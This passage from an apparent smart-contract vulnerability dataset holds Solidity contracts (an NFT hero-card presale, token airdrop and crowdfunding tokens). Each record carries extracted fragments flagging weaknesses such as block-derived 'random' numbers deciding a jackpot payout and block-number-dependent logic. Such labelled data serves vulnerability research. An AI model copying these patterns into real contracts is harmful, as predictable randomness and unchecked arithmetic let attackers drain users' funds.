  "content": "pragma solidity ^0.4.23;\ninterface ERC165 {\n function supportsInterface(bytes4 interfaceID) external view returns (bool);\n}\ncontract ERC721 is ERC165 {\n event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);\n event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);\n event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);\n function balanceOf(address _owner) external view returns (uint256);\n function ownerOf(uint256 _tokenId) external view returns (address);\n function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external;\n function safeTransferFrom(address _from, address _to, uint256 _tokenId) external;\n function transferFrom(address _from, address _to, uint256 _tokenId) external;\n function approve(address _approved, uint256 _tokenId) external;\n function setApprovalForAll(address _operator, bool _approved) external;\n function getApproved(uint256 _tokenId) external view returns (address);\n function isApprovedForAll(address _owner, address _operator) external view returns (bool);\n}\ninterface ERC721TokenReceiver {\n function onERC721Received(address _from, uint256 _tokenId, bytes data) external returns(bytes4);\n}\ncontract Random {\n uint256 _seed;\n function _rand() internal returns (uint256) {\n _seed = uint256(keccak256(_seed, blockhash(block.number - 1), block.coinbase, block.difficulty));\n return _seed;\n }\n function _randBySeed(uint256 _outSeed) internal view returns (uint256) {\n return uint256(keccak256(_outSeed, blockhash(block.number - 1), block.coinbase, block.difficulty));\n }\n}\ncontract AccessAdmin {\n bool public isPaused = false;\n address public addrAdmin;\n event AdminTransferred(address indexed preAdmin, address indexed newAdmin);\n constructor() public {\n addrAdmin = msg.sender;\n }\n modifier onlyAdmin() {\n require(msg.sender == addrAdmin);\n _;\n }\n modifier whenNotPaused() {\n require(!isPaused);\n _;\n }\n modifier whenPaused {\n require(isPaused);\n _;\n }\n function setAdmin(address _newAdmin) external onlyAdmin {\n require(_newAdmin != address(0));\n emit AdminTransferred(addrAdmin, _newAdmin);\n addrAdmin = _newAdmin;\n }\n function doPause() external onlyAdmin whenNotPaused {\n isPaused = true;\n }\n function doUnpause() external onlyAdmin whenPaused {\n isPaused = false;\n }\n}\ncontract AccessService is AccessAdmin {\n address public addrService;\n address public addrFinance;\n modifier onlyService() {\n require(msg.sender == addrService);\n _;\n }\n modifier onlyFinance() {\n require(msg.sender == addrFinance);\n _;\n }\n function setService(address _newService) external {\n require(msg.sender == addrService || msg.sender == addrAdmin);\n require(_newService != address(0));\n addrService = _newService;\n }\n function setFinance(address _newFinance) external {\n require(msg.sender == addrFinance || msg.sender == addrAdmin);\n require(_newFinance != address(0));\n addrFinance = _newFinance;\n }\n}\ncontract ELHeroToken is ERC721,AccessAdmin{\n struct Card {\n uint16 protoId;\n uint16 hero;\n uint16 quality;\n uint16 feature;\n uint16 level;\n uint16 attrExt1;\n uint16 attrExt2;\n }\n Card[] public cardArray;\n uint256 destroyCardCount;\n mapping (uint256 => address) cardIdToOwner;\n mapping (address => uint256[]) ownerToCardArray;\n mapping (uint256 => uint256) cardIdToOwnerIndex;\n mapping (uint256 => address) cardIdToApprovals;\n mapping (address => mapping (address => bool)) operatorToApprovals;\n mapping (address => bool) actionContracts;\n function setActionContract(address _actionAddr, bool _useful) external onlyAdmin {\n actionContracts[_actionAddr] = _useful;\n }\n function getActionContract(address _actionAddr) external view onlyAdmin returns(bool) {\n return actionContracts[_actionAddr];\n }\n event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);\n event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);\n event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);\n event CreateCard(address indexed owner, uint256 tokenId, uint16 protoId, uint16 hero, uint16 quality, uint16 createType);\n event DeleteCard(address indexed owner, uint256 tokenId, uint16 deleteType);\n event ChangeCard(address indexed owner, uint256 tokenId, uint16 changeType);\n modifier isValidToken(uint256 _tokenId) {\n require(_tokenId >= 1 && _tokenId <= cardArray.length);\n require(cardIdToOwner[_tokenId] != address(0));\n _;\n }\n modifier canTransfer(uint256 _tokenId) {\n address owner = cardIdToOwner[_tokenId];\n require(msg.sender == owner || msg.sender == cardIdToApprovals[_tokenId] || operatorToApprovals[owner][msg.sender]);\n _;\n }\n function supportsInterface(bytes4 _interfaceId) external view returns(bool) {\n return (_interfaceId == 0x01ffc9a7 || _interfaceId == 0x80ac58cd || _interfaceId == 0x8153916a) && (_interfaceId != 0xffffffff);\n }\n constructor() public {\n addrAdmin = msg.sender;\n cardArray.length += 1;\n }\n function name() public pure returns(string) {\n return \"Ether League Hero Token\";\n }\n function symbol() public pure returns(string) {\n return \"ELHT\";\n }\n function balanceOf(address _owner) external view returns (uint256){\n require(_owner != address(0));\n return ownerToCardArray[_owner].length;\n }\n function ownerOf(uint256 _tokenId) external view returns (address){\n return cardIdToOwner[_tokenId];\n }\n function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external whenNotPaused{\n _safeTransferFrom(_from, _to, _tokenId, data);\n }\n function safeTransferFrom(address _from, address _to, uint256 _tokenId) external whenNotPaused{\n _safeTransferFrom(_from, _to, _tokenId, \"\");\n }\n function transferFrom(address _from, address _to, uint256 _tokenId) external whenNotPaused isValidToken(_tokenId) canTransfer(_tokenId){\n address owner = cardIdToOwner[_tokenId];\n require(owner != address(0));\n require(_to != address(0));\n require(owner == _from);\n _transfer(_from, _to, _tokenId);\n }\n function approve(address _approved, uint256 _tokenId) external whenNotPaused{\n address owner = cardIdToOwner[_tokenId];\n require(owner != address(0));\n require(msg.sender == owner || operatorToApprovals[owner][msg.sender]);\n cardIdToApprovals[_tokenId] = _approved;\n emit Approval(owner, _approved, _tokenId);\n }\n function setApprovalForAll(address _operator, bool _approved) external whenNotPaused{\n operatorToApprovals[msg.sender][_operator] = _approved;\n emit ApprovalForAll(msg.sender, _operator, _approved);\n }\n function getApproved(uint256 _tokenId) external view isValidToken(_tokenId) returns (address) {\n return cardIdToApprovals[_tokenId];\n }\n function isApprovedForAll(address _owner, address _operator) external view returns (bool) {\n return operatorToApprovals[_owner][_operator];\n }\n function totalSupply() external view returns (uint256) {\n return cardArray.length - destroyCardCount - 1;\n }\n function _safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) internal isValidToken(_tokenId) canTransfer(_tokenId){\n address owner = cardIdToOwner[_tokenId];\n require(owner != address(0));\n require(_to != address(0));\n require(owner == _from);\n _transfer(_from, _to, _tokenId);\n uint256 codeSize;\n assembly { codeSize := extcodesize(_to) }\n if (codeSize == 0) {\n return;\n }\n bytes4 retval = ERC721TokenReceiver(_to).onERC721Received(_from, _tokenId, data);\n require(retval == 0xf0b9e5ba);\n }\n function _transfer(address _from, address _to, uint256 _tokenId) internal {\n if (_from != address(0)) {\n uint256 indexFrom = cardIdToOwnerIndex[_tokenId];\n uint256[] storage cdArray = ownerToCardArray[_from];\n require(cdArray[indexFrom] == _tokenId);\n if (indexFrom != cdArray.length - 1) {\n uint256 lastTokenId = cdArray[cdArray.length - 1];\n cdArray[indexFrom] = lastTokenId;\n cardIdToOwnerIndex[lastTokenId] = indexFrom;\n }\n cdArray.length -= 1;\n if (cardIdToApprovals[_tokenId] != address(0)) {\n delete cardIdToApprovals[_tokenId];\n }\n }\n cardIdToOwner[_tokenId] = _to;\n ownerToCardArray[_to].push(_tokenId);\n cardIdToOwnerIndex[_tokenId] = ownerToCardArray[_to].length - 1;\n emit Transfer(_from != address(0) ? _from : this, _to, _tokenId);\n }\n function createCard(address _owner, uint16[5] _attrs, uint16 _createType) external whenNotPaused returns(uint256){\n require(actionContracts[msg.sender]);\n require(_owner != address(0));\n uint256 newCardId = cardArray.length;\n require(newCardId < 4294967296);\n cardArray.length += 1;\n Card storage cd = cardArray[newCardId];\n cd.protoId = _attrs[0];\n cd.hero = _attrs[1];\n cd.quality = _attrs[2];\n cd.feature = _attrs[3];\n cd.level = _attrs[4];\n _transfer(0, _owner, newCardId);\n emit CreateCard(_owner, newCardId, _attrs[0], _attrs[1], _attrs[2], _createType);\n return newCardId;\n }\n function _changeAttrByIndex(Card storage _cd, uint16 _index, uint16 _val) internal {\n if (_index == 2) {\n _cd.quality = _val;\n } else if(_index == 3) {\n _cd.feature = _val;\n } else if(_index == 4) {\n _cd.level = _val;\n } else if(_index == 5) {\n _cd.attrExt1 = _val;\n } else if(_index == 6) {\n _cd.attrExt2 = _val;\n }\n }\n function changeCardAttr(uint256 _tokenId, uint16[5] _idxArray, uint16[5] _params, uint16 _changeType) external whenNotPaused isValidToken(_tokenId) {\n require(actionContracts[msg.sender]);\n Card storage cd = cardArray[_tokenId];\n if (_idxArray[0] > 0) _changeAttrByIndex(cd, _idxArray[0], _params[0]);\n if (_idxArray[1] > 0) _changeAttrByIndex(cd, _idxArray[1], _params[1]);\n if (_idxArray[2] > 0) _changeAttrByIndex(cd, _idxArray[2], _params[2]);\n if (_idxArray[3] > 0) _changeAttrByIndex(cd, _idxArray[3], _params[3]);\n if (_idxArray[4] > 0) _changeAttrByIndex(cd, _idxArray[4], _params[4]);\n emit ChangeCard(cardIdToOwner[_tokenId], _tokenId, _changeType);\n }\n function destroyCard(uint256 _tokenId, uint16 _deleteType) external whenNotPaused isValidToken(_tokenId) {\n require(actionContracts[msg.sender]);\n address _from = cardIdToOwner[_tokenId];\n uint256 indexFrom = cardIdToOwnerIndex[_tokenId];\n uint256[] storage cdArray = ownerToCardArray[_from];\n require(cdArray[indexFrom] == _tokenId);\n if (indexFrom != cdArray.length - 1) {\n uint256 lastTokenId = cdArray[cdArray.length - 1];\n cdArray[indexFrom] = lastTokenId;\n cardIdToOwnerIndex[lastTokenId] = indexFrom;\n }\n cdArray.length -= 1;\n cardIdToOwner[_tokenId] = address(0);\n delete cardIdToOwnerIndex[_tokenId];\n destroyCardCount += 1;\n emit Transfer(_from, 0, _tokenId);\n emit DeleteCard(_from, _tokenId, _deleteType);\n }\n function safeTransferByContract(uint256 _tokenId, address _to) external whenNotPaused{\n require(actionContracts[msg.sender]);\n require(_tokenId >= 1 && _tokenId <= cardArray.length);\n address owner = cardIdToOwner[_tokenId];\n require(owner != address(0));\n require(_to != address(0));\n require(owner != _to);\n _transfer(owner, _to, _tokenId);\n }\n function getCard(uint256 _tokenId) external view isValidToken(_tokenId) returns (uint16[7] datas) {\n Card storage cd = cardArray[_tokenId];\n datas[0] = cd.protoId;\n datas[1] = cd.hero;\n datas[2] = cd.quality;\n datas[3] = cd.feature;\n datas[4] = cd.level;\n datas[5] = cd.attrExt1;\n datas[6] = cd.attrExt2;\n }\n function getOwnCard(address _owner) external view returns(uint256[] tokens, uint32[] flags) {\n require(_owner != address(0));\n uint256[] storage cdArray = ownerToCardArray[_owner];\n uint256 length = cdArray.length;\n tokens = new uint256[](length);\n flags = new uint32[](length);\n for (uint256 i = 0; i < length; ++i) {\n tokens[i] = cdArray[i];\n Card storage cd = cardArray[cdArray[i]];\n flags[i] = uint32(uint32(cd.protoId) * 1000 + uint32(cd.hero) * 10 + cd.quality);\n }\n }\n function getCardAttrs(uint256[] _tokens) external view returns(uint16[] attrs) {\n uint256 length = _tokens.length;\n require(length <= 64);\n attrs = new uint16[](length * 11);\n uint256 tokenId;\n uint256 index;\n for (uint256 i = 0; i < length; ++i) {\n tokenId = _tokens[i];\n if (cardIdToOwner[tokenId] != address(0)) {\n index = i * 11;\n Card storage cd = cardArray[tokenId];\n attrs[index] = cd.hero;\n attrs[index + 1] = cd.quality;\n attrs[index + 2] = cd.feature;\n attrs[index + 3] = cd.level;\n attrs[index + 4] = cd.attrExt1;\n attrs[index + 5] = cd.attrExt2;\n }\n }\n }\n}\ncontract Presale is AccessService, Random {\n ELHeroToken tokenContract;\n mapping (uint16 => uint16) public cardPresaleCounter;\n mapping (address => uint16[]) OwnerToPresale;\n uint256 public jackpotBalance;\n event CardPreSelled(address indexed buyer, uint16 protoId);\n event Jackpot(address indexed _winner, uint256 _value, uint16 _type);\n constructor(address _nftAddr) public {\n addrAdmin = msg.sender;\n addrService = msg.sender;\n addrFinance = msg.sender;\n tokenContract = ELHeroToken(_nftAddr);\n cardPresaleCounter[1] = 20;\n cardPresaleCounter[2] = 20;\n cardPresaleCounter[3] = 20;\n cardPresaleCounter[4] = 20;\n cardPresaleCounter[5] = 20;\n cardPresaleCounter[6] = 20;\n cardPresaleCounter[7] = 20;\n cardPresaleCounter[8] = 20;\n cardPresaleCounter[9] = 20;\n cardPresaleCounter[10] = 20;\n cardPresaleCounter[11] = 20;\n cardPresaleCounter[12] = 20;\n cardPresaleCounter[13] = 20;\n cardPresaleCounter[14] = 20;\n cardPresaleCounter[15] = 20;\n cardPresaleCounter[16] = 20;\n cardPresaleCounter[17] = 20;\n cardPresaleCounter[18] = 20;\n cardPresaleCounter[19] = 20;\n cardPresaleCounter[20] = 20;\n cardPresaleCounter[21] = 20;\n cardPresaleCounter[22] = 20;\n cardPresaleCounter[23] = 20;\n cardPresaleCounter[24] = 20;\n cardPresaleCounter[25] = 20;\n }\n function() external payable {\n require(msg.value > 0);\n jackpotBalance += msg.value;\n }\n function setELHeroTokenAddr(address _nftAddr) external onlyAdmin {\n tokenContract = ELHeroToken(_nftAddr);\n }\n function cardPresale(uint16 _protoId) external payable whenNotPaused{\n uint16 curSupply = cardPresaleCounter[_protoId];\n require(curSupply > 0);\n require(msg.value == 0.25 ether);\n uint16[] storage buyArray = OwnerToPresale[msg.sender];\n uint16[5] memory param = [10000 + _protoId, _protoId, 6, 0, 1];\n tokenContract.createCard(msg.sender, param, 1);\n buyArray.push(_protoId);\n cardPresaleCounter[_protoId] = curSupply - 1;\n emit CardPreSelled(msg.sender, _protoId);\n jackpotBalance += msg.value * 2 / 10;\n addrFinance.transfer(address(this).balance - jackpotBalance);\n uint256 seed = _rand();\n if(seed % 100 == 99){\n emit Jackpot(msg.sender, jackpotBalance, 2);\n msg.sender.transfer(jackpotBalance);\n }\n }\n function withdraw() external {\n require(msg.sender == addrFinance || msg.sender == addrAdmin);\n addrFinance.transfer(address(this).balance);\n }\n function getCardCanPresaleCount() external view returns (uint16[25] cntArray) {\n cntArray[0] = cardPresaleCounter[1];\n cntArray[1] = cardPresaleCounter[2];\n cntArray[2] = cardPresaleCounter[3];\n cntArray[3] = cardPresaleCounter[4];\n cntArray[4] = cardPresaleCounter[5];\n cntArray[5] = cardPresaleCounter[6];\n cntArray[6] = cardPresaleCounter[7];\n cntArray[7] = cardPresaleCounter[8];\n cntArray[8] = cardPresaleCounter[9];\n cntArray[9] = cardPresaleCounter[10];\n cntArray[10] = cardPresaleCounter[11];\n cntArray[11] = cardPresaleCounter[12];\n cntArray[12] = cardPresaleCounter[13];\n cntArray[13] = cardPresaleCounter[14];\n cntArray[14] = cardPresaleCounter[15];\n cntArray[15] = cardPresaleCounter[16];\n cntArray[16] = cardPresaleCounter[17];\n cntArray[17] = cardPresaleCounter[18];\n cntArray[18] = cardPresaleCounter[19];\n cntArray[19] = cardPresaleCounter[20];\n cntArray[20] = cardPresaleCounter[21];\n cntArray[21] = cardPresaleCounter[22];\n cntArray[22] = cardPresaleCounter[23];\n cntArray[23] = cardPresaleCounter[24];\n cntArray[24] = cardPresaleCounter[25];\n }\n function getBuyCount(address _owner) external view returns (uint32) {\n return uint32(OwnerToPresale[_owner].length);\n }\n function getBuyArray(address _owner) external view returns (uint16[]) {\n uint16[] storage buyArray = OwnerToPresale[_owner];\n return buyArray;\n }\n function eventPirze(address _addr, uint8 _id) public onlyAdmin{\n require(_id == 20 || _id == 21);\n uint16 curSupply = cardPresaleCounter[_id];\n require(curSupply > 0);\n uint16[] storage buyArray = OwnerToPresale[_addr];\n uint16[5] memory param = [10000 + _id, _id, 6, 0, 1];\n tokenContract.createCard(_addr, param, 1);\n buyArray.push(_id);\n cardPresaleCounter[_id] = curSupply - 1;\n }\n}",
  "extract_feature": [
    "function _rand() internal returns (uint256) {\n_seed = uint256(keccak256(_seed, blockhash(block.number - 1), block.coinbase, block.difficulty));\nreturn _seed;\n}",
    "function _randBySeed(uint256 _outSeed) internal view returns (uint256) {\nreturn uint256(keccak256(_outSeed, blockhash(block.number - 1), block.coinbase, block.difficulty));\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6e750a970a4fdc0b9b"
  },
  "filename": "810.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6e750a970a4fdc0b9c"
  },
  "filename": "970.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract OATToken is StandardToken, SafeMath {\n string public constant name = \"Ocean\";\n string public constant symbol = \"OAT\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 625;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function OATToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(210000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6e750a970a4fdc0b9d"
  },
  "filename": "980.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HKHCToken is StandardToken, SafeMath {\n string public constant name = \"Happily keep health\";\n string public constant symbol = \"HKHC\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 625;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function HKHCToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(1000000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > 